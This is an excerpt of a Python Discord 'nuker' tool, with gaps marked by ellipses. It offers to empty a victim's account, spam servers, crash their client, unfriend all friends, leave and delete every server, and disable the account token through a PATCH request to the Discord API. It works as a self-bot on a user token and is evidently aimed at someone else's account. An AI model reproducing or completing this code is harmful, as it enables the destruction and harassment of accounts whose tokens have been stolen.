...
print('\n')
print('1 - UTLIMATE NUKE (makes the whole account empty, spam servers and crashs his discord)')
print('2 - UNFRIEND ALL FRIENDS')
print('3 - DELETE AND LEAVE ALL SERVER')
...
def unfriender():
    ...
    async def on_ready():
        ...
        print('\n')
        print('[[UNFRIENDING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')
    bot.run(token, bot=False)
...
def tokenDisable(token):
    ...
    r = requests.patch('https://discordapp.com/api/v9/users/@me', headers={'Authorization': token})
